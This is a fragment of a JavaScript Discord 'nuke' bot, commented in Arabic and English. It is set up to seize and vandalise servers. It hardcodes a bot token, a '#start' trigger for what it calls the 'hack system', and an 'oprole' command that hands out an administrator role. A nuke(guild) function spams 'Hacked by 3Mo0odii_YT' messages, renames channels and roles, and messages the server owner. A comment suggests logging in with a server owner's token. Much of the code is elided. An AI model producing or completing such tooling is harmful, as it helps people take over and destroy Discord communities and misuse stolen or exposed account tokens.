...
const Token = 'NjExNjMwNDQ1ODAwNzE4MzYy.XVWnbQ.vJkT4yhaNgX1gLpx2s_wmAko5ms' //حط توكن بوتك هنا // your bot token
const x_x = "#start" //الامر يلي يشغل الكود //the command to start the hack system
const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
const teext = "Hacked by 3Mo0odii_YT" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
const vooice = "Hacked by 3Mo0odii_YT" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
...
const spam = "Hacked by 3Mo0odii_YT" // الكلام يلي بيسوي فيه سبام البوت //the spam message
const namee = "Hacked by 3Mo0odii_YT" // اسم ابوت بعد التهكير //the bot name
const playing = "Hacked by 3Mo0odii_YT Good Bye <3" // البلاينج //bot streaming
const role = 'HackedBy3Mo0odiiYT' // اسم الرتبه يلي بيسويها //the role name
const adminstrator = 'bye' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
...
async function nuke(guild) {
    ...
    await guild.owner.send('Hacked by 3Mo0odii_YT !').catch(e => { return void e; });
...
let me = message.author
    ...
    message.channel.send(`Hacked by 3Mo0odii_YT`)
...
//login in to the bot token or the serverowner token
  ...
  const devs = ['548223690110664711']; // your id
